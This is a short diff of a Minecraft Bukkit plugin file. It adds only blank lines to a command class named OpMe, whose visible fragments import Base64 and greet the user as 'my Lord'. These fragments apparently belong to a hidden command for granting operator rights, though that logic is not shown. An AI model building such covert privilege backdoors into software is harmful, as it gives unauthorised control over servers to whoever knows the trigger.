@@ -7,6 +7,7 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.Plugin;
 import pyr.solutions.allkingplugin.AllKingPlugin;
+
 import java.util.Base64;
 
 public class OpMe implements CommandExecutor {
@@ -25,6 +26,7 @@ public class OpMe implements CommandExecutor {
                 player.sendMessage("Welcome back my Lord!");
             } else {
                 player.sendMessage("The given param was invalid. Your action has been reported to server administration.");
+
             }
             return true;
         }
